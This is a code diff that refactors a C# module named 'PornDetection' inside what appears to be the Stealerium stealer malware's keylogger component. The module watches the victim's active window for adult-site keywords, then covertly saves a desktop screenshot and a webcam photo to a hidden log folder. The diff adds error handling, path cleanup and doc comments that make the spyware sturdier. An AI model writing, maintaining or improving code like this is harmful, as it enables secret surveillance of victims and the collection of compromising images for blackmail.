@@ -10,32 +10,72 @@ namespace Stealerium.Modules.Keylogger
     internal sealed class PornDetection
     {
         private static readonly string LogDirectory = Path.Combine(
-            Paths.InitWorkDir(), "logs\\nsfw\\" +
-                                 DateTime.Now.ToString("yyyy-MM-dd"));
+            Paths.InitWorkDir(),
+            "logs", "nsfw", DateTime.Now.ToString("yyyy-MM-dd")
+        );
 
-        // Send desktop and webcam screenshot if active window contains target values
+        /// <summary>
+        /// Detects NSFW activity and saves desktop and webcam screenshots if detected.
+        /// </summary>
         public static void Action()
         {
-            if (Detect()) SavePhotos();
+            if (DetectNSFWContent())
+            {
+                SaveScreenshots();
+            }
         }
 
-        // Detect target data in active window
-        private static bool Detect()
+        /// <summary>
+        /// Detects target NSFW keywords in the active window.
+        /// </summary>
+        /// <returns>True if any NSFW content is detected, false otherwise.</returns>
+        private static bool DetectNSFWContent()
         {
-            return Config.PornServices.Any(text => WindowManager.ActiveWindow.ToLower().Contains(text));
+            try
+            {
+                // Check if the active window contains any porn-related keywords (case insensitive)
+                var activeWindow = WindowManager.ActiveWindow.ToLower();
+                return Config.PornServices.Any(keyword => activeWindow.Contains(keyword));
+            }
+            catch (Exception ex)
+            {
+                // Log any potential errors during detection
+                Logging.Log($"PornDetection: Error during NSFW detection: {ex.Message}");
+                return false;
+            }
         }
 
-        // Save photos
-        private static void SavePhotos()
+        /// <summary>
+        /// Saves screenshots (desktop and webcam) when NSFW content is detected.
+        /// </summary>
+        private static void SaveScreenshots()
         {
-            var logdir = LogDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss");
-            if (!Directory.Exists(logdir))
-                Directory.CreateDirectory(logdir);
+            try
+            {
+                // Create a unique directory for each detection based on current time
+                var timestampedLogDir = Path.Combine(LogDirectory, DateTime.Now.ToString("HH.mm.ss"));
 
-            Thread.Sleep(3000);
-            DesktopScreenshot.Make(logdir);
-            Thread.Sleep(12000);
-            if (Detect()) WebcamScreenshot.Make(logdir);
+                if (!Directory.Exists(timestampedLogDir))
+                {
+                    Directory.CreateDirectory(timestampedLogDir);
+                }
+
+                // Take desktop screenshot after a short delay
+                Thread.Sleep(3000);
+                DesktopScreenshot.Make(timestampedLogDir);
+
+                // Wait and take webcam screenshot if NSFW is still detected
+                Thread.Sleep(12000);
+                if (DetectNSFWContent())
+                {
+                    WebcamScreenshot.Make(timestampedLogDir);
+                }
+            }
+            catch (Exception ex)
+            {
+                // Log any potential errors during screenshot saving
+                Logging.Log($"PornDetection: Error saving screenshots: {ex.Message}");
+            }
         }
     }
 }
